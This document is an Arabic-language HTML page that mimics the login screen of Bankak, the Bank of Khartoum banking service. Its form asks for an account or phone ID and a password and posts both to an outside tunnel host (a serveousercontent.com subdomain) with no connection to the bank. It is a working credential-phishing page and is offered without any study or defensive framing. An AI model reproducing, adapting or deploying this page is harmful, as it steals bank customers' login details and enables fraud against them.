<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bankak - بنكك</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #fff; }
        .top-red { background-color: #e31e24; height: 250px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; border-bottom-left-radius: 50% 20px; border-bottom-right-radius: 50% 20px; }
        .logo-img { width: 150px; margin-bottom: 10px; }
        .container { padding: 20px; margin-top: -30px; }
        .input-group { position: relative; margin-bottom: 15px; }
        input { width: 100%; padding: 15px 40px 15px 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: right; }
        .login-btn { width: 100%; padding: 15px; background: linear-gradient(to bottom, #ff3030, #b30000); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.2); }
        .footer-links { display: flex; justify-content: space-between; margin-top: 20px; color: #666; font-size: 14px; }
        .social-icons { margin-top: 50px; display: flex; justify-content: center; gap: 20px; }
        .icon-circle { width: 40px; height: 40px; border-radius: 50%; background-color: #f0f0f0; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

<div class="top-red">
    <div style="font-size: 50px; font-weight: bold;">بنكك</div>
    <div style="font-size: 25px; letter-spacing: 5px;">bankak</div>
</div>

<div class="container">
    <form action="https://osama-web-2026.serveousercontent.com" method="POST">
        <div class="input-group">
            <input type="text" name="email" placeholder="أدخل رقم المعرف (رقم الحساب أو الهاتف)" required>
        </div>
        <div class="input-group">
            <input type="password" name="pass" placeholder="أدخل كلمة المرور" required>
        </div>
        <button type="submit" class="login-btn">تسجيل الدخول</button>
    </form>

    <div class="footer-links">
        <span>تسجيل جديد؟</span>
        <span>لا تستطيع تسجيل الدخول؟</span>
    </div>

    <div class="social-icons">
        <div class="icon-circle">f</div>
        <div class="icon-circle">📞</div>
        <div class="icon-circle">📍</div>
        <div class="icon-circle">🌍</div>
    </div>
    <p style="color: #999; font-size: 12px; margin-top: 10px;">فيس بوك | المساعدة | مواقعنا | بنك الخرطوم</p>
</div>

</body>
</html>
